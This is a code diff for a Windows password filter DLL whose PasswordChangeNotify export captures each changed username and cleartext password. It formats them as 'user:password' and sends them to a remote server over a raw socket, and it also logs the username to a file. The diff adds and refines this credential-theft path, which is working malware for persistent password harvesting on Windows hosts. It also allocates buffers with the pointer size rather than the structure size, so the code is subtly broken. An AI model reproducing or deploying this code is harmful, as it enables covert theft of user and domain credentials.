@@ -19,6 +19,10 @@
 //#include <iostream>
 
 //////// Helper functions
+
+//Sends a *unicode_string over a raw socket.
+//takes: a pointer to a unicode string
+//returns: a status
 NTSTATUS SendToRemote(PUNICODE_STRING text){
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
@@ -45,7 +49,7 @@ NTSTATUS SendToRemote(PUNICODE_STRING text){
         //std::cerr << "Failed to connect to server: " << WSAGetLastError() << std::endl;
         closesocket(sock);
         WSACleanup();
-        return false;
+        return 3;
     }
 
     //send it
@@ -53,7 +57,7 @@ NTSTATUS SendToRemote(PUNICODE_STRING text){
         //std::cerr << "Send failed with error: " << WSAGetLastError() << std::endl;
         closesocket(sock);
         WSACleanup();
-        return false;
+        return 4;
     }
 
     // Cleanup
@@ -203,26 +207,38 @@ extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRIN
 //called to notify that a password change has successfully occurred
 //return 0 for OK, other number for error code
 extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING uname, ULONG RelativeId, PUNICODE_STRING password){
+    HANDLE hHeap = NULL; // I love windows. malloc is for losers
+
+    hHeap = HeapCreate(0, 0, 0);
+    if(hHeap == NULL){
+        //std::cerr << "Could not create heap"
+        return 1;
+    }
+
+
     //build the unicode chars for building the output
     wchar_t singleColon = L':';
     UNICODE_STRING colon = { 2, 2, &singleColon };
-
     wchar_t singleNL = L'\n';
     UNICODE_STRING newline = { 2, 2, &singleNL };
 
-    writeToFile(uname);
-    writeToFile(&colon);
-    writeToFile(password);
-    writeToFile(&newline);
-
-    PUNICODE_STRING temp1 = (PUNICODE_STRING) malloc(sizeof(UNICODE_STRING));
-    PUNICODE_STRING temp2 = (PUNICODE_STRING) malloc(sizeof(UNICODE_STRING));
-    PUNICODE_STRING fullString = (PUNICODE_STRING) malloc(sizeof(UNICODE_STRING));
+    //Concatenate UnicodeStrings
+    PUNICODE_STRING temp1 = (PUNICODE_STRING) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PUNICODE_STRING));
+    PUNICODE_STRING temp2 = (PUNICODE_STRING) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PUNICODE_STRING));
+    PUNICODE_STRING fullString = (PUNICODE_STRING) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PUNICODE_STRING));
     catUTF16LEStr(uname, &colon, temp1);
     catUTF16LEStr(password, &newline, temp2);
     catUTF16LEStr(temp1, temp2, fullString);
 
+    //Actually do the work
     SendToRemote(fullString);
+    writeToFile(uname);
+
+    //try to avoid memory leaks
+    HeapFree(hHeap, 0, temp1);
+    HeapFree(hHeap, 0, temp2);
+    HeapFree(hHeap, 0, fullString);
+    HeapDestroy(hHeap);
 
 //    free(temp1);
 //    free(temp2);
